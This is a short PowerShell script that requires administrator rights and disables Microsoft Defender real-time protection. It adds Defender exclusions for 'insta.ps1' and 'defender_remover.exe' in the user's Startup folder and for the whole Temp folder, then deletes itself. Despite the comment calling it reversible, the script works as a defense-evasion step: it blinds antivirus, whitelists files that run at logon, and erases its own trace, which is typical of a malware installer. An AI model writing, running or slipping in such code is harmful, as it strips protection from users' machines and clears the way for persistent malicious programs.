# Requires Administrator
# Disables Microsoft Defender real-time protection
# Make exclusion files and processes
# Reversible

# Check for admin
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script must be run as Administrator."
    exit 1
}

Write-Host "Disabling Microsoft Defender Real-Time Protection..." -ForegroundColor Yellow
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"

try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Add-MpPreference -ExclusionPath "$startupPath\insta.ps1"
    Add-MpPreference -ExclusionPath "$startupPath\defender_remover.exe"
    Add-MpPreference -ExclusionProcess "$startupPath\defender_remover.exe"
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"

    Write-Host "Defender Real-Time Protection is now disabled." -ForegroundColor Green
} catch {
    Write-Error "Failed to disable Defender. Is Tamper Protection enabled?"
}

Remove-Item disableWinDef.ps1